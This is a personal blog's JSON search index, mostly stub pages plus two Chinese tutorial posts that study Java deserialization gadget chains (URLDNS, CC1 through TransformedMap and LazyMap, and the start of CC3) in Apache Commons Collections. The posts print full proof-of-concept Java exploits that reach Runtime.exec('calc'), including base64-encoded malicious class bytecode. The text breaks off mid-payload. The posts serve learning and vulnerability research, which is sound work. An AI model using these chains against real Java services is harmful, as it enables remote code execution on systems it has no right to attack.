{"meta":{"title":"Pp1ove","subtitle":null,"description":null,"author":"Pp1ove","url":"https://pp1ove.gitee.io"},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-01-01T13:06:03.809Z","comments":false,"path":"about/index.html","permalink":"https://pp1ove.gitee.io/about/index.html","excerpt":"","text":"[さくら荘のPp1ove] 与&nbsp; Pp1ove&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"https://pp1ove.gitee.io/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"client/index.html","permalink":"https://pp1ove.gitee.io/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"comment/index.html","permalink":"https://pp1ove.gitee.io/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"donate/index.html","permalink":"https://pp1ove.gitee.io/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-01-01T14:55:48.877Z","comments":false,"path":"music/index.html","permalink":"https://pp1ove.gitee.io/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"https://pp1ove.gitee.io/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"links/index.html","permalink":"https://pp1ove.gitee.io/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"https://pp1ove.gitee.io/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"https://pp1ove.gitee.io/tags/index.html","excerpt":"","text":""},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"video/index.html","permalink":"https://pp1ove.gitee.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-01-14T03:38:55.581Z","comments":false,"path":"theme-sakura/index.html","permalink":"https://pp1ove.gitee.io/theme-sakura/index.html","excerpt":"","text":"","keywords":"Hexo 主题 Sakura 🌸"}],"posts":[{"title":"CC链学习-上","slug":"CC链学习-上","date":"2021-07-13T03:03:25.000Z","updated":"2021-07-19T13:00:57.611Z","comments":false,"path":"2021/07/13/CC链学习-上/","link":"","permalink":"https://pp1ove.gitee.io/2021/07/13/CC链学习-上/","excerpt":"","text":"前言本文主要参考P神的java漫谈,以及一些网上的资料,加上一些自己的思考。因为我也接触java没多久,文章对于和我一样的小白来说可能就比较友好。可能也会有一些理解方面的错误,欢迎师傅们指正。 URLDNSURLDNS是ysoserial中最简单的一条利用链,因为其如下的优点,⾮常适合我们在检测反序列化漏洞时使⽤： 使⽤Java内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 在ysoserial下生成URLDNS命令为: java -jar .\\ysoserial.jar URLDNS &quot;http://xxx.dnslog.cn&quot; 大致流程为: HashMap-&gt;readObject() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() URLDNS.java 关键的代码只有简简单单的四十多行 利用链 HashMap.readObject() HashMap.putVal() HashMap.hash() * URL.hashCode() 原理分析先贴poc,大家可以一边调试一边分析 import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static Object urldns() throws Exception{ //漏洞出发点 hashmap，实例化出来 HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); //URL对象传入自己测试的dnslog URL url = new URL(&quot;http://txbjb7.dnslog.cn&quot;); //反射获取 URL的hashcode方法 Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //使用内部方法 f.setAccessible(true); // hashMap.put时会调用hash(key),这里先把hashCode设置为其他值,避免和后面的DNS请求混淆 f.set(url, 0xAAA); hashMap.put(url, &quot;Yasax1&quot;); // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode f.set(url, -1); // 序列化成对象，输出出来 return hashMap; } public static void main(String[] args) throws Exception { payload2File(urldns(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //将构造好的payload序列化后写入文件中 ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //读取写入的payload，并进行反序列化 ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } 首先在HashMap类中,有出发反序列化的方法readObject,找到HashMap类中的readobject方法 在readObject方法的最后一排,调用了hash方法,然后又调用了key的hashCode()方法,这里我们的key可控 接下来在java.net.URL类中,存在一个hashCode()方法, 这里的handler是一个URLStreamHandler 对象,跟进他的hashCode方法,不过这里我们进入handler.hashCode有一个前提,就是我们的hashCode=-1; 跟进getHostAddress方法 这里有一个InetAddress.getByName(host),获取目标ip地址,其实在网络中就是一次DNS请求. 所以我们只需要new一个hashmap,然后让它的key等于一个java.net.URL对象,然后,设置这个 URL 对象的 hashCode 为初始值 -1 ,这样反序列化时将会重新计算其 hashCode ,才能触发到后⾯的DNS请求,到此我们的链子就构造完成了 不过ysoserial跟我们的exp有一些不同,那是因为ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询,重写了一个SilentURLStreamHandler类,这和我们的exp中的 f.set(url, 0xAAA);是一样的效果 流程图 CC1前言Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。CC1指的是lazymap那条链子,但是网上也有很多关于transformedmap的分析,这里也分析一下。还有就是CC1的测试环境需要在Java 8u71以前。在此改动后，AnnotationInvocationHandler#readObject不再直接使⽤反序列化得到的Map对象，⽽是新建了⼀个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，⽽原来我们精⼼构造的Map不再执⾏set或put操作， 测试环境 JDK 1.7 Commons Collections 3.1 transformedmap链POCimport java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.annotation.RetentionPolicy; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Method; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; public class CommonCollections11 { public static Object generatePayload() throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;calc&quot; }) }; //这里和我上面说的有一点点不同,因为Runtime.getRuntime()没有实现Serializable接⼝,所以这里用的Runtime.class。class类实现了serializable接⼝ Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(&quot;value&quot;, &quot;xxx&quot;); Map outmap = TransformedMap.decorate(innermap, null, transformerChain); //通过反射获得AnnotationInvocationHandler类对象 Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //通过反射获得cls的构造函数 Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); //这里需要设置Accessible为true，否则序列化失败 ctor.setAccessible(true); //通过newInstance()方法实例化对象 Object instance = ctor.newInstance(Retention.class, outmap); return instance; } public static void main(String[] args) throws Exception { payload2File(generatePayload(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //将构造好的payload序列化后写入文件中 ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //读取写入的payload，并进行反序列化 ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } 调用链ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() TransformedMapTransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。 这里它的构造方法为protected类型,创建对象需要通过TransformedMap.decorate()来获得一个TransformedMap实例 Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer); 在TransformedMap类中有三个方法,它会执行传入的参数的transform()方法 transformertransformer是一个接口,它只有一个待实现的方法 public interface Transformer { public Object transform(Object input); } ConstantTransformer ConstantTransformer函数是实现transformer接口的一个类,在该函数里面有一个构造函数,会传入我们的Object,在transform方法中又会将该Object返回 InvokerTransformer该类的构造方法中传入三个变量,分别是方法名,参数的类型,和参数 然后又会在transform方法中利用反射的知识,执行了input对象的iMethodName,但是这里有一个问题,就是transform方法中的input对象我们并不能控制,这里就要用到我们的下一个知识点 ChainedTransformer该方法首先有一个构造函数,将传入的Transformer类型的数组赋值给iTransformers,这里iTransformers是一个数组 而在该函数的transform方法中,有意思的来了 它会将前一个transform返回的结果作为后一个对象的传参,假设我们传入的Transformer[]数组中有两个数据 new ConstantTransformer(Runtime.getRuntime()) new InvokerTransformer(“exec”, new Class[]{String.class},new Object[{“calc”}) 这样我们就可以执行系统命令了,当然还有个前提:就是触发TransformedMap中的那三个方法,这也就是关键的地方了,这三个方法的类型都是protected,前两个由下面这两个public方法调用 而checkSetValue则可以从注释中看到,当调用该类的setvalue方法时,会自动调用checkSetValue方法,而该类的setValue方法则继承于它的父类AbstractInputCheckedMapDecorator 去它的父类看一下 AbstractInputCheckedMapDecorator 这里的this.parent传入的就是TransformedMap,AbstractInputCheckedMapDecorator 的根父类实际就是 Map ，所以我们现在只需要找到一处 readObject 方法，只要它调用了 Map.setValue() 方法,即可完成整个反序列化链。(这里涉及一些多态的知识) 下面，我们来看满足这个条件的 AnnotationInvocationHandler 类，该类属于 JDK1.7 自带 AnnotationInvocationHandler AnnotationInvocationHandler类的readObject 方法中看到 setValue 方法的调用 这里先看看它的构造函数 这里先直接给出两个条件： sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第⼀个参数必须是 Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X 被 TransformedMap.decorate 修饰的Map中必须有⼀个键名为X的元素 所以，在Retention有⼀个⽅法，名为value；所以，为了再满⾜第⼆个条件，我需要给Map中放⼊⼀个Key是value的元素： innerMap.put(&quot;value&quot;, &quot;xxxx&quot;); 接下来来分析一下为什么需要有一个方法名和我们key一样 AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) { this.type = var1; //this.type是我们传入的Annotation类型Class this.memberValues = var2; //memberValues为我们传入的map } else { throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); } } private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); //跟进getInstance,这里先看下面的图片以及文字 } catch (IllegalArgumentException var9) { throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); } Map var3 = var2.memberTypes(); //这个方法返回var2.memberTypes,我们的memberTypes是一个hashmap,而且key为&quot;value&quot; Iterator var4 = this.memberValues.entrySet().iterator();//memberValues为我们传入的map while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); //遍历map String var6 = (String)var5.getKey();//获取map的key,这里我们传入一个值为value的key,令var6=&quot;value&quot; Class var7 = (Class)var3.get(var6);//在var3中找key为var6的值,如果在这里没有找到,则返回了null,所以我们需要找一个Annotation类型有方法名为我们map的key if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); } } } } var1.getAnnotationType跟进var1.getAnnotationType方法 这里前面两个直接过了,来到了第三步,new AnnotationType(var0),这里var0为我们传入的Annotation类型Class跟进去 后面返回了Annotation类型的所有Methods。接着遍历的它的所有方法,这里经过了一个for循环,var6是获得的Methods,var7接着获取了方法名。然后将返回的方法名put到了memberTypes中,这里比较关键,后面会用上,现在大家就记住memberTypes是一个hashmap对象,里面的key是我们传入的Annotation类型Class的方法名字 总结一下这一段就类似于这段代码: java.lang.annotation.Retention在该类中有一个value方法 所以我们map类再传一个 innermap.put(&quot;value&quot;, &quot;xxx&quot;); 其实这里不止这一个类可以使用,如java.lang.annotation.Target 也可 流程图 lazymap链POCimport java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; public class CommonCollections12 { public static Object generatePayload() throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;calc&quot; }) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(&quot;value&quot;, &quot;xxx&quot;); Map outmap = LazyMap.decorate(innermap,transformerChain); //通过反射获得AnnotationInvocationHandler类对象 Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //通过反射获得cls的构造函数 Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); //这里需要设置Accessible为true，否则序列化失败 ctor.setAccessible(true); //通过newInstance()方法实例化对象 InvocationHandler handler = (InvocationHandler)ctor.newInstance(Retention.class, outmap); Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler); Object instance = ctor.newInstance(Retention.class, mapProxy); return instance; } public static void main(String[] args) throws Exception { payload2File(generatePayload(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //将构造好的payload序列化后写入文件中 ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //读取写入的payload，并进行反序列化 ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } 调用链ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 这里的后半段和前面一样,所以我们只用看前面就行了 lazymap在lazymap中有一个get方法,可以执行factory成员的transform方法,这里 这里factory可控,if条件也挺好进入的,将我们传入的map不要有后面传入的key就行 我们接下来只需要找到一个readObject方法调用了该get方法即可 AnnotationInvocationHandler 其实在该类中的readObject方法中并没有找到能有直接引用map的get方法的,但是有一个invoke中可以执行get方法,这就需要引入一点点java代理的知识 这里就简单的提一下: InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); //创建一个InvocationHandler接口的对象 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); //第一个参数为类加载器,第二个参数类型,第三个参数传入我们的接口 当我们引用proxyMap中的方法时,会先在handler中的invoke方法中进行修饰,执行invoke里的代码 我们的memberValues成员为lazymap对象(memberValues的赋值在构造函数中,且我们可控),当我们执行到下面这里的时候,就会触发代理机制,然后进入Invoke方法,从而触发命令执行 流程图 调试时遇到的问题有时在进行调试的时候我是没有进入if语句的,但也莫名奇妙的弹出了计算器,而且按照我们原本的思路是应该进入if语句的(super.map中是不含我们的key的) 然后后面切换了一下打断点的位置又可以进去了,我认为这里是因为在调试的时候会调用一些方法,从而影响了我们的调试(这个坑搞了我大半天,希望不要有人跟我一样卡在同样的位置了呜呜呜) 结语CC1很重要,后面几条链子后半段几乎都是用CC1的","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"Java复现","slug":"Java复现","permalink":"https://pp1ove.gitee.io/tags/Java复现/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"CC链学习-下","slug":"CC链学习-下","date":"2021-07-13T03:03:25.000Z","updated":"2021-07-19T13:01:03.045Z","comments":false,"path":"2021/07/13/CC链学习-下/","link":"","permalink":"https://pp1ove.gitee.io/2021/07/13/CC链学习-下/","excerpt":"","text":"CC3测试环境 jdk1.7 Commons Collections 3.1 POCimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.bcel.util.ClassLoader; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.Transformer; import org.jboss.util.Base64; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC32 { public static void main(String[] args) throws Exception{ //字节码 byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4